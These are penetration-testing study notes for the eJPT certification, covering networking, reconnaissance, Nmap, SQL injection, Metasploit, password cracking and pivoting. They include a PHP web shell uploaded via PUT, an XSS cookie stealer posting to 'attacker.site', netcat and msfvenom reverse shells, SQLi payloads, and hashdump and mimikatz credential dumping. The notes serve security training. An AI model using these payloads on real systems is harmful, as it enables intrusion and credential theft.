# eLearnSecurity Junior Penetration Testing (eJPT)
# High-Yield Notes by Joas — Condensed & Indexed

---

## 📋 TABLE OF CONTENTS

1. [Network Computer Concepts](#1-network-computer-concepts)
   - 1.1 [Network Types](#11-network-types)
   - 1.2 [Key Terms & Identifiers](#12-key-terms--identifiers)
   - 1.3 [OSI Model & Protocols](#13-osi-model--protocols)
   - 1.4 [Routing](#14-routing)
2. [Information Gathering (OSINT)](#2-information-gathering-osint)
   - 2.1 [Passive Recon Methods](#21-passive-recon-methods)
   - 2.2 [Subdomain Enumeration Tools](#22-subdomain-enumeration-tools)
   - 2.3 [OSINT Tools](#23-osint-tools)
3. [Footprinting & Scanning (Nmap)](#3-footprinting--scanning-nmap)
   - 3.1 [Scan Techniques](#31-scan-techniques)
   - 3.2 [Host Discovery](#32-host-discovery)
   - 3.3 [Port Specification](#33-port-specification)
   - 3.4 [Service & OS Detection](#34-service--os-detection)
   - 3.5 [Timing & Performance](#35-timing--performance)
   - 3.6 [NSE Scripts](#36-nse-scripts)
   - 3.7 [Evasion & Spoofing](#37-evasion--spoofing)
   - 3.8 [Output Formats](#38-output-formats)
4. [Vulnerability Assessment](#4-vulnerability-assessment)
   - 4.1 [VA Process](#41-va-process)
   - 4.2 [Nessus](#42-nessus)
5. [Web Attacks](#5-web-attacks)
   - 5.1 [Banner Grabbing / Fingerprinting](#51-banner-grabbing--fingerprinting)
   - 5.2 [HTTP Verbs & Exploitation](#52-http-verbs--exploitation)
6. [Netcat](#6-netcat)
7. [Directory Enumeration](#7-directory-enumeration)
   - 7.1 [DirBuster](#71-dirbuster)
   - 7.2 [Dirb](#72-dirb)
   - 7.3 [Gobuster](#73-gobuster)
8. [Google Hacking (Dorking)](#8-google-hacking-dorking)
9. [SQL Injection](#9-sql-injection)
   - 9.1 [SQLi Types](#91-sqli-types)
   - 9.2 [Blind SQLi](#92-blind-sqli)
   - 9.3 [SQLMap](#93-sqlmap)
10. [Backdoors](#10-backdoors)
11. [Metasploit & Msfvenom](#11-metasploit--msfvenom)
    - 11.1 [Msfconsole Workflow](#111-msfconsole-workflow)
    - 11.2 [Msfvenom Payload Generation](#112-msfvenom-payload-generation)
    - 11.3 [Meterpreter](#113-meterpreter)
12. [Password Attacks](#12-password-attacks)
    - 12.1 [Attack Types](#121-attack-types)
    - 12.2 [Hydra](#122-hydra)
    - 12.3 [John the Ripper](#123-john-the-ripper)
13. [Buffer Overflow](#13-buffer-overflow)
14. [eJPT Exam Notes](#14-ejpt-exam-notes)
    - 14.1 [Networking Cheatsheet](#141-networking-cheatsheet)
    - 14.2 [NetBIOS & Windows Shares](#142-netbios--windows-shares)
    - 14.3 [ARP Poisoning](#143-arp-poisoning)
    - 14.4 [Pivoting](#144-pivoting)
    - 14.5 [Exam Reminders](#145-exam-reminders)

---

## 1. Network Computer Concepts

### 1.1 Network Types

| Type | Description |
|------|-------------|
| **LAN** | Local Area Network — short distance (office, building) |
| **WLAN** | Wireless LAN |
| **WAN** | Wide Area Network — spans continents; internet is the largest WAN |
| **MAN** | Metropolitan Area Network — city-scale |
| **PAN** | Personal Area Network — single person (phone + laptop) |
| **VPN** | Virtual Private Network — encrypted tunnel between endpoints |

**Topologies:** Bus, Ring, Star, Mesh (full/partial)

**Architecture:** Peer-to-Peer (P2P) vs. Client/Server (tiered)

---

### 1.2 Key Terms & Identifiers

- **IP Address** — Logical identifier; IPv4 = 32-bit; IPv6 = 128-bit
- **MAC Address** — Physical identifier; 48-bit / 6 bytes; assigned to NIC at manufacturing
- **Port** — 16-bit integer (0–65535); identifies service/process on a host
  - Well-known: 0–1023
  - Registered: 1024–49151
  - Ephemeral: 49152–65535
- **Socket** — Unique combination of IP + Port
- **DNS** — Translates domain names → IP addresses (`nslookup`)
- **ARP** — Maps IP → MAC address (Data Link Layer)
- **RARP** — Reverse ARP (IP from MAC); obsolete, replaced by DHCP

**Quick Commands:**
```
hostname                  # Get hostname
ipconfig / ip addr        # Get IP address
ipconfig /all / ip addr   # Get MAC address
netstat -a                # List all open ports
```

**Reserved IPv4 Ranges:**
- `0.0.0.0 – 0.255.255.255` — "THIS network"
- `127.0.0.0 – 127.255.255.255` — Loopback (localhost)
- `192.168.0.0 – 192.168.255.255` — Private networks

---

### 1.3 OSI Model & Protocols

| Layer | Name | Key Protocols |
|-------|------|---------------|
| 7 | Application | HTTP, FTP, DNS, SMTP |
| 6 | Presentation | SSL/TLS, encoding |
| 5 | Session | NetBIOS, RPC |
| 4 | Transport | TCP, UDP |
| 3 | Network | IP, ARP, ICMP |
| 2 | Data Link | Ethernet, MAC |
| 1 | Physical | Cables, radio |

**Common Ports:**

| Port | Protocol |
|------|----------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 115 | SFTP |
| 137–139 | NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 1433 | MS SQL |
| 3306 | MySQL |
| 3389 | RDP |

---

### 1.4 Routing

- **Static Routing** — Admin manually adds routes; no overhead, no adaptability
- **Default Routing** — All packets sent to same next-hop when no specific route exists
- **Dynamic Routing** — Automatically adapts using protocols (RIP, OSPF)
- **Metrics:** Hop count, Delay, Bandwidth, Load, Reliability

**Linux Route Commands:**
```bash
ip route                                      # View routing table
ip route add 10.0.3.0/24 via 10.0.3.1        # Add route
ip route add 10.0.3.0/24 via 10.0.3.1 dev eth0 # Via specific interface
sudo nmcli connection modify eth0 +ipv4.routes "10.0.3.0/24 10.0.3.1"  # NetworkManager
sudo netplan apply                            # Apply Netplan changes
```

**View ARP/Routes:**
```bash
ip neighbour         # Linux ARP cache
arp -a               # Windows/Linux ARP table
ip route             # Linux routing table
route print          # Windows routing table
netstat -r           # macOS routing table
```

---

## 2. Information Gathering (OSINT)

### 2.1 Passive Recon Methods

- **Whois** — Owner, IP, server type: `whois domain.com`
- **Shodan** — Internet-connected device search: `https://shodan.io`
- **Netcraft** — Site report, server tech: `https://toolbar.netcraft.com/site_report`
- **Wappalyzer / BuiltWith** — Identify web tech stack
- **Certificate Transparency (CT)** — `https://crt.sh/?q=%.target.com`
- **ARIN** — IP number registry: `https://arin.net`
- **ASN** — Autonomous System Number lookup: `https://bgp.he.net`
- **Robtex** — DNS info: `https://robtex.com`

**Subdomain Enumeration Methods:**
- Scraping, brute-force, alterations/permutations
- Certificate Transparency logs (crt.sh)
- SSL Subject Alternate Name (SAN)
- SPF records, DNS zone transfer (AXFR)
- Git repositories, public datasets

---

### 2.2 Subdomain Enumeration Tools

| Tool | Key Usage |
|------|-----------|
| **Sublist3r** | Multi-source scraping: `sublist3r.py -d target.com -o out.txt` |
| **Amass** | Brute force + ASN: `amass -d target.com -o out.txt` |
| **theHarvester** | Emails, subdomains, hosts: `theharvester -d target.com -b all` |
| **Knockpy** | DNS brute-force: `knockpy target.com` |
| **CTFR** | CT logs: `python3 ctfr.py -d target.com -o out.txt` |
| **Gobuster** | DNS mode: `gobuster -m dns -u target.com -w wordlist.txt` |
| **Subfinder** | Multi-source: `subfinder -d target.com -o out.txt` |
| **Fierce** | AXFR + brute force: `fierce -dns target.com` |
| **Dnsrecon** | Brute + cache snoop: `dnsrecon -d target.com -D wordlist.txt -t brt` |
| **Massdns** | Fast resolver: `./bin/massdns -r resolvers.txt -t A -o S -w out.txt domains.txt` |

---

### 2.3 OSINT Tools

| Tool | Purpose |
|------|---------|
| **Recon-ng** | Modular web recon (Shodan, GitHub, Virustotal hooks) |
| **Maltego** | Visual OSINT graph analysis |
| **Metagoofil** | Extract metadata from public docs |
| **Twint** | Twitter scraping (no API needed) |
| **Searx** | Anonymous metasearch (70+ engines) |
| **Censys** | Internet asset discovery |

---

## 3. Footprinting & Scanning (Nmap)

### 3.1 Scan Techniques

| Flag | Scan Type |
|------|-----------|
| `-sS` | **TCP SYN** (stealth/half-open) — **default as root** |
| `-sT` | TCP Connect (full 3-way handshake) — default without root |
| `-sU` | **UDP** scan |
| `-sA` | TCP ACK (firewall detection) |
| `-sW` | TCP Window scan |
| `-sN` | TCP Null scan |
| `-sF` | TCP FIN scan |
| `-sX` | TCP Xmas scan |
| `-sM` | TCP Maimon scan |
| `-sO` | IP Protocol scan |
| `-sI` | Idle scan (zombie) |
| `-b` | FTP Bounce scan |

---

### 3.2 Host Discovery

| Flag | Description |
|------|-------------|
| `-sL` | List targets only (no scan) |
| `-sn` / `-sP` | Ping scan only (no port scan) |
| `-Pn` | Skip host discovery (treat all as up) |
| `-PS` | TCP SYN ping |
| `-PA` | TCP ACK ping |
| `-PU` | UDP ping |
| `-PE` | ICMP echo ping |
| `-PP` | ICMP timestamp ping |
| `-PM` | ICMP address mask ping |
| `-PR` | ARP ping (local network) |
| `-n` | Disable DNS resolution |

---

### 3.3 Port Specification

| Flag | Description |
|------|-------------|
| `-p 21` | Single port |
| `-p 21-100` | Port range |
| `-p-` | All ports (1–65535) |
| `-F` | Fast scan (top 100 ports) |
| `--top-ports 2000` | Top N ports |
| `-p U:53,T:80` | Specify TCP+UDP ports |

---

### 3.4 Service & OS Detection

| Flag | Description |
|------|-------------|
| `-sV` | Service/version detection |
| `-sV --version-all` | Most aggressive version detection |
| `-O` | OS detection |
| `-O --osscan-guess` | Guess OS aggressively |
| `-A` | All-in-one: OS + version + scripts + traceroute |
| `--traceroute` | TCP-based traceroute |

---

### 3.5 Timing & Performance

| Flag | Speed | Use Case |
|------|-------|----------|
| `-T0` | Paranoid | IDS evasion |
| `-T1` | Sneaky | IDS evasion |
| `-T2` | Polite | Low bandwidth |
| `-T3` | Normal | Default |
| `-T4` | Aggressive | Fast/reliable network |
| `-T5` | Insane | Fastest (risk of missing ports) |

**Recommended full scan:** `nmap -T4 --open -sS --min-rate=1000 --max-retries=2 -p- -oN full-scan <target>`

---

### 3.6 NSE Scripts

| Flag | Description |
|------|-------------|
| `-sC` | Run default scripts |
| `--script=banner` | Run specific script |
| `--script=http*` | Wildcard scripts |
| `--script=smb-vuln*` | SMB vuln scripts |
| `--script snmp-sysdescr --script-args snmpcommunity=admin` | Script with args |

**Useful NSE combos:**
```bash
nmap -Pn --script=dns-brute domain.com
nmap -p80 --script http-sql-injection target.com
nmap -p80 --script http-unsafe-output-escaping target.com
nmap --script smb-vuln-ms17-010 -p445 <target>
nmap -n -Pn -vv -O -sV --script smb-enum*,smb-vuln* 192.168.1.1
```

---

### 3.7 Evasion & Spoofing

| Flag | Description |
|------|-------------|
| `-f` | Fragment packets |
| `--mtu 32` | Custom MTU offset |
| `-D decoy1,decoy2,ME` | Use decoy IPs |
| `-S <spoof IP>` | Spoof source IP |
| `-g 53` | Spoof source port (e.g., DNS port 53) |
| `--proxies http://proxy:8080` | Route through proxy |
| `--data-length 200` | Append random data |
| `--spoof-mac 00:11:22:33:44:55` | Spoof MAC address |
| `--badsum` | Send bad checksums (detect stateless FW) |

**IDS Evasion combo:**
```bash
nmap -f -t 0 -n -Pn --data-length 200 -D 192.168.1.101,192.168.1.102,ME <target>
```

---

### 3.8 Output Formats

| Flag | Format |
|------|--------|
| `-oN` | Normal text |
| `-oX` | XML |
| `-oG` | Grepable |
| `-oA` | All three formats |
| `-v` / `-vv` | Verbose |
| `-d` | Debug |
| `--open` | Show only open ports |
| `--reason` | Show reason for port state |

---

## 4. Vulnerability Assessment

### 4.1 VA Process

**4 Steps:**
1. **Vulnerability Identification** — Scan with automated tools + manual testing
2. **Vulnerability Analysis** — Root cause (e.g., outdated library)
3. **Risk Assessment** — Assign severity; consider affected systems, ease of attack, potential damage
4. **Remediation** — Patch, config change, new security procedures

**VA Types:**
- **Host Assessment** — Critical servers
- **Network Assessment** — Policies preventing unauthorized access
- **Database Assessment** — DB misconfigs, rogue DBs
- **Application Scans** — Web app front-end + source code

**VA vs Pen Test:**
- VA = automated; finds what *might* be exploitable; no proof
- Pen Test = manual + automated; *proves* exploitability

---

### 4.2 Nessus

- **Purpose:** Vulnerability scanner by Tenable; #1 for accuracy and coverage
- **Start:** `service nessusd start` → visit `https://localhost:8834`

**Common Issues & Fixes:**
- **Network Discovery:** Enable "Turn on network discovery" in Windows settings
- **Authentication Failure:** Check username format (no domain prefix), correct password
- **Access Permissions:** User must be in local `Administrators` group; add `LocalAccountTokenFilterPolicy = 1` registry key on Windows 10
- **Remote Registry:** Enable `RemoteRegistry` service (at least Manual startup)
- **Host detected as dead:** Check network connectivity, VLAN config, restart Nessus service

**Best Report Format:** HTML, custom with all details, grouped by plugin

**Key Settings:**
- Disable "Show superseded patches" to reduce noise
- Enable "Live Results" for passive re-checking of known hosts

**Office 365 Scan:** Requires Azure registered app with Company Admin + User Account Admin roles

---

## 5. Web Attacks

### 5.1 Banner Grabbing / Fingerprinting

**Purpose:** Identify web server type, version, OS from HTTP headers

**Methods:**
- **Banner grab (HTTP):** `nc <target> 80` → `HEAD / HTTP/1.0`
- **Banner grab (HTTPS):** `openssl s_client -connect target.com:443` → `HEAD / HTTP/1.0`
- **Version scan:** `nmap -sV <target>`
- **Automated:** `httprint -P0 -h <target> -s signatures.txt`

**Header Order Fingerprinting (if obfuscated):**
- Apache: Date → Server → Last-Modified → ETag → Content-Length → Content-Type
- nginx: Server → Date → Content-Type

**Send malformed requests:** `GET / SANTA CLAUS/1.1` — different error pages reveal server

---

### 5.2 HTTP Verbs & Exploitation

| Verb | Purpose |
|------|---------|
| `GET` | Retrieve resource |
| `POST` | Submit data (body only) |
| `HEAD` | Headers only (no body) |
| `OPTIONS` | See allowed verbs |
| `PUT` | **Upload file to server** (dangerous!) |
| `DELETE` | **Remove file** (DoS risk) |

**Check allowed verbs:**
```bash
nc <target> 80
OPTIONS / HTTP/1.0
```

**Upload shell via PUT:**
```bash
wc -m shell.php          # Get content length first
nc <target> 80
PUT /shell.php HTTP/1.0
Content-type: text/html
Content-length: <length>

<?php if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';} ?>
```
Then access: `http://target/shell.php?cmd=whoami`

**XSS Cookie Stealer Payload:**
```javascript
<script>
var i = new Image();
i.src="http://attacker.site/log.php?q="+document.cookie;
</script>
```

---

## 6. Netcat

**Key Flags:** `-l` listen, `-v` verbose, `-z` zero-I/O (scan), `-k` keep alive, `-e` execute, `-u` UDP, `-n` no DNS

| Task | Command |
|------|---------|
| Grab webpage | `nc google.com 80` → `GET /index.html HTTP/1.1` |
| Chat listener | `nc -lv 8888` |
| Chat connect | `nc host1 8888` |
| File receive | `nc -l 2222 > file.txt` |
| File send | `nc host1 2222 < file.txt` |
| Port scan (single) | `nc -zv host2 22` |
| Port scan (range) | `nc -zv host1 1-1024 2>&1 \| grep succeeded` |
| Reverse shell (listener) | `nc -lv 6666` |
| Reverse shell (victim) | `nc -v <attacker> 6666 -e /bin/bash` |
| Backdoor shell (Linux) | `nc -n -v -l -p 5555 -e /bin/bash` |
| Web server | `printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" \| nc -l 8999` |
| HTTP GET | `printf "GET / HTTP/1.0\r\n\r\n" \| nc google.com 80` |
| File receive (TCP) | `nc -l 1499 > file.out` |

---

## 7. Directory Enumeration

### 7.1 DirBuster

- **Tool:** OWASP GUI tool for brute-forcing directories/files
- **How:** Sends HTTP GET requests; looks for 200 (found) or 403 (forbidden = exists but restricted)
- **Wordlist location:** `/usr/share/dirbuster/wordlists/`
- **Key options:** Threads, recursive, file extensions, proxy support, requests/second limiter

**HTTP Status Codes:**
- `200` — Success (file/dir exists)
- `301/302` — Redirect
- `403` — Forbidden (exists, restricted)
- `404` — Not found

---

### 7.2 Dirb

- **Tool:** CLI-based web content scanner
- **Default wordlist:** ~4612 words
- **Vuln wordlists:** `/usr/share/dirb/wordlists/vulns/`

```bash
dirb http://target.com
dirb http://target.com /usr/share/dirb/wordlists/vulns/apache.txt
dirb http://target.com -o results.txt                    # Save output
dirb http://target.com -a "Mozilla/5.0 ..."              # Custom user-agent
dirb http://target.com -c "COOKIE:XYZ"                  # With cookie
dirb http://target.com -u "admin:password"               # Basic auth
```

---

### 7.3 Gobuster

```bash
gobuster dir -u http://target.com -w wordlist.txt -o output.txt
gobuster dns -d target.com -w wordlist.txt               # DNS subdomain mode
gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html  # With extensions
```

---

## 8. Google Hacking (Dorking)

**Core Operators:**

| Operator | Purpose | Example |
|----------|---------|---------|
| `site:` | Restrict to domain | `site:target.com` |
| `intitle:` | Search page title | `intitle:"admin login"` |
| `inurl:` | Search URL | `inurl:admin` |
| `intext:` | Search page body | `intext:password` |
| `filetype:` | Filter by file type | `filetype:pdf` |
| `link:` | Pages linking to URL | `link:example.com` |
| `info:` | Google's info about page | `info:google.com` |
| `-` | Exclude term | `site:target.com -www` |

**High-Value Dorks:**

```
"Index of /" +passwd
"Index of /admin"
"Index of /backup"
filetype:sql "insert into"
filetype:xls username password email
filetype:log "PHP Error"
inurl:admin.php
"phpMyAdmin MySQL-Dump" filetype:txt
filetype:bak inurl:"htaccess|passwd|shadow"
"robots.txt" "Disallow:" filetype:txt
filetype:config web.config
"#mysql dump" filetype:sql
site:*.target.com                          (subdomains)
```

---

## 9. SQL Injection

### 9.1 SQLi Types

| Type | Description |
|------|-------------|
| **Error-based** | DB errors leak structure info |
| **Union-based** | `UNION SELECT` to extract data |
| **Boolean-based Blind** | True/False responses reveal data char-by-char |
| **Time-based Blind** | `SLEEP()`/`WAITFOR DELAY` — infer results from response time |
| **Out-of-band** | DNS/HTTP requests to attacker server (`xp_dirtree`, `UTL_HTTP`) |

**Basic Test Payloads:**
```sql
'                              -- Basic quote test
' OR '1'='1                    -- Classic auth bypass
' OR 1=1--                     -- Comment out rest
' UNION SELECT null--          -- Union test
' AND SLEEP(5)--               -- Time-based test
' UNION SELECT null,null--     -- Add nulls until columns match
```

---

### 9.2 Blind SQLi

```sql
-- Boolean-based: extract admin password char by char
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'--

-- Time-based
xyz' AND (SELECT CASE WHEN (Username='Administrator' AND SUBSTRING(Password,1,1) > 'm')
THEN SLEEP(5) ELSE SLEEP(0) END FROM Users)--

-- Check current DB user
SELECT substring(user(),1,1);
```

---

### 9.3 SQLMap

```bash
# Basic GET injection
sqlmap -u 'http://target/page.php?id=1' -p id

# Specify technique (U=UNION, B=Boolean, T=Time, E=Error, S=Stacked)
sqlmap -u 'http://target/page.php?id=1' -p id --technique=U

# From saved request file (Burp Suite)
sqlmap -r request.txt --dbs

# Enumerate databases
sqlmap -u 'http://target/page.php?id=1' --dbs

# Enumerate tables in a DB
sqlmap -u 'http://target/page.php?id=1' -D database_name --tables

# Dump a table
sqlmap -u 'http://target/page.php?id=1' -D database_name -T table_name --dump

# POST request
sqlmap -u 'http://target/login.php' --data='user=admin&pass=test' -p user

# Crack passwords in sqlmap results
sqlmap -r attack.txt --dbs
sqlmap -r attack.txt -D nowasp --tables
sqlmap -r attack.txt -D nowasp -T accounts --dump
```

---

## 10. Backdoors

- A **backdoor** is a program that gives remote access without proper authorization
- Two components: **Client** (victim) + **Server** (attacker)
- Uses `socket` module to send/receive commands over network
- Can **daemonize** (run in background process)
- Detection prevention: mimics legitimate browser/app traffic

**Simple Python Backdoor Structure:**
- Server: Listen for connections → Send commands → Receive output
- Client: Connect to attacker → Receive command → Run via `subprocess` → Return output

**Protection:** Zero-trust model for all software; firewall policies per-application; monitor for suspicious outbound connections

---

## 11. Metasploit & Msfvenom

### 11.1 Msfconsole Workflow

```bash
msfconsole                          # Start Metasploit
search <term>                       # Search modules
use exploit/multi/handler           # Use a module
show options                        # Show module options
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT <port>
set RHOST <target IP>
set RPORT <target port>
exploit / run                       # Execute
exploit -j                          # Run in background
sessions -l                         # List sessions
sessions -i 1                       # Interact with session 1
background                          # Background current session
```

**MS17-010 (EternalBlue):**
```bash
use auxiliary/scanner/smb/smb_ms17_010   # Check vulnerability
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <target>
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

---

### 11.2 Msfvenom Payload Generation

```bash
# List payloads
msfvenom -l

# Windows reverse shell (exe)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f exe -o shell.exe

# Linux reverse shell (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f elf -o shell

# macOS
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f macho -o shell

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f raw > shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f asp -o shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f war -o shell.war

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<port> -f raw -o shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<port> -f raw -o shell.sh

# Specify architecture
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f exe -o shell.exe

# Encrypt payload
msfvenom --encrypt aes256 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f exe -o shell.exe

# Remove bad chars (null byte)
msfvenom -p windows/shell_bind_tcp -b '\x00' -f raw
```

---

### 11.3 Meterpreter

```bash
# Info gathering
sysinfo
ifconfig
route
getuid
getsystem                           # Try automatic privilege escalation

# Privilege escalation
use exploit/windows/local/bypassuac
set session 1
exploit
getsystem                           # Retry after bypassuac

# Dump Windows password hashes
use post/windows/gather/hashdump
set session 1
run

# Kiwi (mimikatz)
load kiwi
creds_all

# Navigation (Windows — escape backslashes)
cd C:\\Users\\

# Shell
shell                               # Drop to OS shell

# Upgrade simple shell to meterpreter
use post/multi/manage/shell_to_meterpreter
set session 1
run
```

---

## 12. Password Attacks

### 12.1 Attack Types

| Attack | Description |
|--------|-------------|
| **Brute Force** | Try all possible combinations (slow but thorough) |
| **Dictionary** | Use wordlist of common passwords |
| **Credential Stuffing** | Reuse stolen credentials from data breaches |
| **Password Spraying** | Try few common passwords across many accounts (avoids lockout) |
| **Keylogger** | Capture keystrokes (hardware or software) |
| **MitM** | Intercept credentials in transit |
| **Phishing** | Trick users into entering credentials on fake site |

---

### 12.2 Hydra

```bash
# Basic SSH
hydra -l root -P /usr/share/john/password.lst <IP> ssh

# SSH with user list
hydra -L users.txt -P pass.txt -t 10 <IP> ssh -s 22

# FTP
hydra -l raj -P pass.txt 192.168.1.108 ftp

# Telnet
hydra -L users.txt -P pass.txt telnet://<IP>

# HTTP POST form
hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" \
  -L users.txt -P pass.txt -f -V

# RDP
hydra -L users.txt -P pass.txt rdp://<IP>

# Custom port
hydra -L users.txt -P pass.txt <IP> ftp -s 2121

# Multiple hosts
hydra -L users.txt -P pass.txt -M hosts.txt ftp

# Brute force password generation (numeric 1-3 chars)
hydra -l raj -x 1:3:1 <IP> ftp

# Save output
hydra -L users.txt -P pass.txt <IP> ftp -o result.txt

# Resume
hydra -R

# Options summary:
# -l / -L   single user / user list file
# -p / -P   single pass / password file
# -t         threads
# -s         custom port
# -V         verbose
# -f         stop after first found
# -e nsr     try null/same-as-login/reversed
# -o         output to file
```

---

### 12.3 John the Ripper

```bash
# Install
sudo apt install john

# Prepare Linux shadow file
unshadow /etc/passwd /etc/shadow > crackme

# Dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt crackme

# Wordlist with specific users
john --wordlist=/usr/share/wordlists/rockyou.txt --users=victim1 crackme

# Incremental brute force (specific users)
john --incremental --users:Brian crackme

# Crack zip file
zip2john secret.zip > hash.txt
john --format=zip hash.txt

# Show cracked passwords
john --show crackme

# Crack shadow directly
john /etc/shadow
```

---

## 13. Buffer Overflow

**Concept:** Writing more data to a fixed-length buffer than it can hold; overwrites adjacent memory including the **return pointer**

**Attack Flow:**
1. Send specially crafted input exceeding buffer size
2. Overwrite **return address** (EIP/RIP) to point to attacker's shellcode
3. Pad with **NOP sleds** (`\x90`) to increase landing probability
4. Shellcode executes when function returns

**Key Terms:**
- **Buffer** — Fixed-size memory block
- **Return Pointer** — Address of next instruction after function returns
- **NOP Sled** — Series of `\x90` instructions to slide execution into shellcode
- **EXEC("sh")** — Classic Linux shellcode payload (spawns root shell)

**Vulnerable Languages:** C, C++ (direct memory access, no bounds checking)
**Safer Languages:** Java, C#, Perl (automatic bounds checking)

**Finding Offset:** Use pattern generation (Metasploit `pattern_create`, `pattern_offset`)

---

## 14. eJPT Exam Notes

### 14.1 Networking Cheatsheet

**CIDR Quick Reference:**

| CIDR | Hosts | Mask |
|------|-------|------|
| /24 | 256 | 255.255.255.0 |
| /25 | 128 | 255.255.255.128 |
| /26 | 64 | 255.255.255.192 |
| /28 | 16 | 255.255.255.240 |
| /30 | 4 | 255.255.255.252 |

**Netstat:**
```bash
netstat -ano           # Windows
netstat -tunp          # Linux
netstat -p tcp -p udp  # macOS (+ lsof -n -i4TCP)
```

**Wireshark Filters:**
```
http.request.method == GET
tcp.stream eq 0
tcp.seq==1 and tcp.ack==1        # Egress check (outbound)
ip.addr == 192.168.1.1
```

**Ping Sweep:**
```bash
nmap -sn 192.168.1.0/24
fping -a -g 192.168.1.0/24 2>/dev/null
```

---

### 14.2 NetBIOS & Windows Shares

- `<00>` — Machine is a **CLIENT**
- `<20>` — **File sharing enabled** (highest interest)
- `UNIQUE` — Machine has only 1 IP

```bash
# Windows
nbtstat -A <target>
NET VIEW <target>
NET USE \\<IP>\IPC$ "" /u:""     # Null session

# Linux
nmblookup -A <target>
smbclient -L //<target> -N       # List shares (no password)
smbclient //<target>/share -N    # Mount share
enum4linux -a <target>           # Full enumeration
```

**enum4linux default actions:** User enum, share enum, group/member enum, password policy, OS info, nmblookup, printer info

---

### 14.3 ARP Poisoning

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward     # Enable IP forwarding

# Intercept traffic between two hosts
arpspoof -i eth0 -t 192.168.1.5 -r 192.168.1.6
# Then capture with Wireshark
```

---

### 14.4 Pivoting

**Concept:** Use a compromised host as a "foothold" to reach otherwise inaccessible network segments

```bash
# From Meterpreter session on compromised host
ifconfig                              # Check for other network interfaces
background                            # Background meterpreter session

# Add route to new network through compromised host
run autoroute -s 10.10.1.0/24

# Scan second network through the pivot
use auxiliary/scanner/portscan/tcp
set PORTS 22,80,443,3389
set RHOSTS 10.10.1.0/24
run

# Manual Linux route
ip route add 192.168.222.0/24 via 10.175.34.1 dev tap0

# Port forwarding in Meterpreter
portfwd add -l 3389 -p 3389 -r 10.10.1.101
```

---

### 14.5 Exam Reminders

- **Always** do a full port scan (`-p-`); labs have services on high ports (close to 65535)
- After compromising a machine, `cat /etc/hosts` to find virtual hosts
- If a host has ALL ports closed → it's a **CLIENT**
- Use **two tools** to confirm alive hosts (fping AND nmap)
- Try `-Pn` flag when ports show as filtered
- **SQLi:** Test headers, cookies, and POST params — not just URL
- Backups are often `.bak`, `.old`, `.txt` — run gobuster against these extensions
- If gobuster/dirb is blocked → try setting a User-Agent or adding `-c "COOKIE:XYZ"`
- For SQLMap: specify `--technique` to avoid crashing the target
- **Credential reuse** — once you have creds, try them everywhere
- After finding a meterpreter session: run `route` command to look for other network paths
- `scp root@victim:/etc/passwd .` — download files from victim to your machine

---

*Notes compiled from eLearnSecurity Junior Penetration Testing material by Joas Antonio dos Santos Barbosa*
*Labs: https://hackthebox.eu | https://tryhackme.com*
